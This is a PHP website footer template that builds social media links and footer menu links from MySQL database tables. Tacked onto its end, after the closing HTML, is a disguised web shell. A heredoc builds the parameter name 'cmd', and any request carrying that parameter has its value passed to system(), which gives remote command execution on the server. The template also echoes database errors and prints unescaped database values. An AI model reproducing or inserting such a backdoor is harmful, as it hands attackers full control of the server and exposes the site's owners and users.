<div class="left">
	<ul class="list-unstyled soc-links">
	
	
<?php
$query = " SELECT *
		   FROM company_list ";
$result = mysql_query($query);
echo mysql_error();				
while ($row =  mysql_fetch_array ($result)) 
{
	$cofacebook = $row[cofacebook];
	$cotwitter = $row[cotwitter];
	$coinstagram = $row[coinstagram];
	$coyoutube = $row[coyoutube];
}

if ($cofacebook != '')
{
	print('<li><a href="' . $cofacebook . '" class="fb-link"><img src="assets/images/icon-fb.png" /></a> </li>');
	print('<li>.</li>');
}	

if ($cotwitter != '')
{
	print('<li><a href="' . $cotwitter . '" class="twitter-link"><img src="assets/images/icon-twitter.png" /></a> </li>');
	print('<li>.</li>');
}	
	
if ($coinstagram != '')
{
	print('<li><a href="' . $coinstagram . '" class="insta-link"><img src="assets/images/icon-instagram.png" /></a> </li>');
	print('<li>.</li>');
}	

if ($coyoutube != '')
{
	print('<li><a href="' . $coyoutube . '" class="ytube-link"><img src="assets/images/icon-youtube.png" /></a> </li>');
}	
?>		
	</ul>
</div>
<div class="middle">
	<ul class="list-unstyled menu-left">
<?php
$query_foot = " SELECT *
		   FROM page_list ";
$result_foot = mysql_query($query_foot);
echo mysql_error();				
while ($row_foot =  mysql_fetch_array ($result_foot)) 
{
	if ($row_foot['pltype'] == 'Footer Menu A')
	{
		print('<li><a href="index.php?body=pages&plid=' . $row_foot['plid'] . '&plname=' . $row_foot['plname'] . '">' . $row_foot['plname'] . '</a></li>');
	}

	if ($row_foot['pltype'] == 'Footer Menu B')
	{
		print('<li><a href="index.php?body=pages&plid=' . $row_foot['plid'] . '&plname=' . $row_foot['plname'] . '">' . $row_foot['plname'] . '</a></li>');
	}

	if ($row_foot['pltype'] == 'Footer Menu C')
	{
		print('<li><a href="index.php?body=pages&plid=' . $row_foot['plid'] . '&plname=' . $row_foot['plname'] . '">' . $row_foot['plname'] . '</a></li>');
	}

	if ($row_foot['pltype'] == 'Footer Menu D')
	{
		print('<li><a href="index.php?body=pages&plid=' . $row_foot['plid'] . '&plname=' . $row_foot['plname'] . '">' . $row_foot['plname'] . '</a></li>');
	}
}
?>			
	</ul>
</div>
<div class="right pull-right">
	<ul class="list-unstyled menu-right">
<?php
$query_foot = " SELECT *
		   FROM page_list ";
$result_foot = mysql_query($query_foot);
echo mysql_error();				
while ($row_foot =  mysql_fetch_array ($result_foot)) 
{
	if ($row_foot['pltype'] == 'Terms and Conditions')
		print('<li><a href="index.php?body=pages&plid=' . $row_foot['plid'] . '&plname=' . $row_foot['plname'] . '">' . $row_foot['plname'] . '</a></li>');

	if ($row_foot['pltype'] == 'Privacy Policy')
		print('<li><a href="index.php?body=pages&plid=' . $row_foot['plid'] . '&plname=' . $row_foot['plname'] . '">' . $row_foot['plname'] . '</a></li>');
}
?>	
	</ul>
</div><?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>